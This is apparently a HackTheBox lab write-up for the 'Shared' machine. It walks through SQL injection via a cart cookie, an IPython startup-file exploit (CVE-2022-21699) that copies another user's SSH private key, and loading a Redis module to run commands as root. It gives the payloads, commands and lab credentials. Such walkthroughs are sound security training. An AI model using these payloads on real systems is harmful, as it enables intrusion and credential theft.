+++
author = "Khaled Ngm"
title = "Shared write-up (HackTheBox)"
date = "2022-10-29"
description = ""
+++

# Shared write-up HackTheBox
![shared](/images/shared/shared.png)

### 1. Port Scanning and Enumuration
### 2. Exploitation
### 3. Privilege Escalation
* ### USER
* ### ROOT

## Port Scan (Nmap)
* First We will scan target with nmap ``nmap -sV -sC 10.10.11.172``
* I found two open ports ``ssh`` and ``http``
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-29 08:14 EDT
Nmap scan report for 10.10.11.172
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
|_http-title: Did not follow redirect to https://shared.htb
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.55 seconds

```
* First of all lets add  ``shared.htb`` to /etc/hosts file .
* Then when I navigate to ``http://shared.htb`` and added an Item at cart and hover
 at **[proceed to checkout button]** I found that redirect me to subdomain ``checkout.shared.htb``

 ![sub](/images/shared/sub.png)
 * let's add ``checkout.shared.htb`` also to ``/etc/hosts``


* When I proceeded to page I found a **table** that host qty and price of product.
* I clicked pay but nothing happened , it shows only an static alert that payment recieved .
* I opened **Burp** to see request and found that the QTY and Item are stored at cookie ``custom_cart`` parameter .
![cart](/images/shared/cart.png)
* I tried change the QTY and Item and that change in table , after a few minutes I found that it's vulnerable to ``sqli`` .
* We can use ``wappalyzer extension `` that identify the database ``MySQL``.

   ![cart](/images/shared/db.png)
## Exploitation
### SQLi Payloads

* ``{"BTAPXNX4' UNION SELECT NULL-- -":"1"}`` >> Nothing returned at table.
* ``{"BTAPXNX4' UNION SELECT NULL,NULL-- -":"1"}`` >> Nothing.
* ``{"BTAPXNX4' UNION SELECT NULL,NULL,NULL-- -":"1"}`` >>>> Returnd the Item and QTY so there are 3 columns at this table .

### Return The name of Available tables.

* We can retrieve table info from information_schema.tables
* ``{"' UNION SELECT NULL,table_name,NULL FROM information_schema.tables -- -":"1"}`` but that show me only one table .
* let's use ``group_concat()`` to get all tables name concatanated ``{"' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables -- -":"1"}`` .

   ![sqli](/images/shared/sqli.png)

* As we can see , we got aa table caled ``user``.

### Return The name of Available columns for ``user`` table .

* We can retrieve table info from information_schema.columns
* ``{"' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='user'-- -":"1"}``

    ![col](/images/shared/col.png)

* ``{"' UNION SELECT NULL,username,NULL FROM user -- -":"1"}`` >> james_mason
* ``{"' UNION SELECT NULL,password,NULL FROM user -- -":"1"}`` >> fc895d4eddc2fc12f995e18c865cf273
* I found that md5 hash was easy to crack using any online tools .
* We have now ``james_mason`` and ``Soleil101`` to log into ``ssh``. 

## Privilege Escalation (User)

* Now we have to escalate our priveleges to ``dan_smith`` user to read user.txt file .

```
ls -la
total 3856
drwxr-xr-x 6 james_mason james_mason    4096 Oct 30 08:51 .
drwxr-xr-x 4 root        root           4096 Jul 14 13:46 ..
lrwxrwxrwx 1 root        root              9 Mar 20  2022 .bash_history -> /dev/null
-rw-r--r-- 1 james_mason james_mason     220 Mar 20  2022 .bash_logout
-rw-r--r-- 1 james_mason james_mason    3526 Mar 20  2022 .bashrc
drwx------ 3 james_mason james_mason    4096 Oct 30 08:51 .gnupg
drwxr-xr-x 2 james_mason james_mason    4096 Oct 28 11:42 .ipython
-rw-r--r-- 1 james_mason james_mason  827827 Oct 13 16:41 linpeas.sh
drwxr-xr-x 3 james_mason james_mason    4096 Oct 29 07:54 .local
-rw-r--r-- 1 james_mason james_mason     807 Mar 20  2022 .profile
-rwxr-xr-x 1 james_mason james_mason 3078592 Oct 28 02:15 pspy64
drwx------ 2 james_mason james_mason    4096 Oct 28 11:48 .ssh
```
* First I used [pspy64]('https://github.com/DominicBreuker/pspy').
* pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute .
* I found That ipython is running with ``UID=1001`` which belongs to developer . 
* Let's know the version of ipython using ``ipython --version`` >> 8.0.0 .
* After a minutes of search I found this [repo]('https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x') that disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another .

```
mkdir -m 777 /opt/scripts_review/profile_default
mkdir -m 777 /opt/scripts_review/profile_default/startup
echo "import os;os.system('cat ~/.ssh/id_rsa > /tmp/dan.key')" > /opt/scripts_review/profile_default/startup/run.py
```

   ![key](/images/shared/danKey.png)
* Now we can login as dan_smith ``chmod 600 dan.key; ssh -i dan.key dan_smith@shared.htb`` .

## Privilege Escalation (Root)

* First I executed [linpeas.sh](https://github.com/topics/linpeas) script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts .

* I found a binary file that belong to root and readable by me .

    ![redis](/images/shared/redis.png)
* Befor Using ``redis-cli`` we have to know first ``username`` and ``password`` to authenticate .
* I used String Command to try to look at an hardcoded password and I wasn't able to identify that , so I downloaded the file locally and executed it .
* ``chmod +x redis_connector_dev ; ./redis_connector_dev`` but I got nothing.
* I started listening on ``6379`` port that redis hosted on and run binary again .

    ![auth](/images/shared/auth.png)
* I got password ``F2WHqJUz2WEz=Gqq`` and default username is ``default`` .
* After minutes of reading about redis pentesting at [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module) I found many methods to explit it .
* I tried to upload php webshell via redis-cli but it failed for me .
* So let's use ``load redis module`` technique .

    ![module](/images/shared/module.png)

* As we don't have git at our htb machine we will clone [exploit](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) locally and transfer it to the machine ``scp -r -i id_rsa.key /path/to/directory user@machine_b_ipaddress:/path/to/destination``.

* Go to RedisModules-ExecuteCommand folder and run command ``make``.

* let's run redis-cli to load module .

```
127.0.0.1:6379> AUTH default F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> module load /home/dan_smith/RedisModules-ExecuteCommand/src/module.so
OK
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
```
* Now we are root :)
## Resources

* https://github.com/payloadbox/sql-injection-payload-list
* https://github.com/topics/linpeas
* https://github.com/DominicBreuker/pspy
* https://www.cve.org/CVERecord?id=CVE-2022-21699
* https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
* https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
